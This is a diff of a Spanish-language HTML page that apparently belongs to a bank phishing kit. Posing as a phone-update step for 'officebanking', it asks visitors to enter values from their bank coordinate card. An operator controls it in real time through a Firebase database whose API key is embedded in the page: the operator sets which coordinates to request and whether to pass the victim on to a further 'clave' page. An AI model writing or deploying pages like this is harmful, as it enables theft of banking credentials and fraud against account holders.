@@ -2,88 +2,105 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Actualizar Teléfono</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #ffffff;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       padding: 2rem;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
     }
-
     h2 {
-      color: #dc3545;
-      margin-bottom: 2rem;
+      margin-bottom: 1rem;
+      text-align: center;
     }
-
-    .code-container {
+    .coordenadas {
       display: flex;
-      justify-content: center;
       gap: 1rem;
+      margin-bottom: 1rem;
     }
-
-    .section {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    .editable-label {
-      width: 40px;
+    .coordenadas div {
       text-align: center;
-      border: none;
-      border-bottom: 1px dashed #ccc;
-      font-size: 16px;
-      margin-bottom: 0.3rem;
     }
-
-    input[type="text"] {
+    input {
       width: 40px;
-      height: 40px;
-      font-size: 22px;
+      padding: 10px;
+      font-size: 18px;
       text-align: center;
-      border: 1px solid #000;
-      border-radius: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
     }
-
     button {
-      margin-top: 2rem;
       padding: 10px 20px;
-      font-size: 16px;
-      background-color: #dc3545;
+      background: red;
       color: white;
+      font-size: 16px;
       border: none;
       border-radius: 5px;
       cursor: pointer;
     }
-
-    button:hover {
-      background-color: #b02a37;
+    .labels {
+      display: flex;
+      justify-content: space-around;
+      width: 100%;
+      max-width: 300px;
+      margin-bottom: 0.5rem;
+    }
+    .labels span {
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
   <h2>Necesitamos actualizar tu teléfono</h2>
-  <form action="verificar.html" method="GET">
-    <div class="code-container">
-      <div class="section">
-        <input type="text" class="editable-label" value="A1" />
-        <input type="text" maxlength="2" required />
-      </div>
-      <div class="section">
-        <input type="text" class="editable-label" value="B2" />
-        <input type="text" maxlength="2" required />
-      </div>
-      <div class="section">
-        <input type="text" class="editable-label" value="C3" />
-        <input type="text" maxlength="2" required />
-      </div>
-    </div>
-    <button type="submit">Validar</button>
-  </form>
+  <div class="labels">
+    <span id="lbl1">--</span>
+    <span id="lbl2">--</span>
+    <span id="lbl3">--</span>
+  </div>
+  <div class="coordenadas">
+    <div><input type="text" maxlength="2" /></div>
+    <div><input type="text" maxlength="2" /></div>
+    <div><input type="text" maxlength="2" /></div>
+  </div>
+  <button onclick="verificar()">Enviar</button>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Escuchar cambios en vivo a las coordenadas
+    db.ref("coordenadas").on("value", (snapshot) => {
+      const labels = snapshot.val();
+      if (labels && labels.length === 3) {
+        document.getElementById("lbl1").innerText = labels[0] || "--";
+        document.getElementById("lbl2").innerText = labels[1] || "--";
+        document.getElementById("lbl3").innerText = labels[2] || "--";
+      }
+    });
+
+    function verificar() {
+      db.ref("validacion").once("value").then(snapshot => {
+        const estado = snapshot.val();
+        if (estado === "correcto") {
+          window.location.href = "clave3.html";
+        } else {
+          window.location.href = "error.html";
+        }
+      });
+    }
+  </script>
 </body>
 </html>
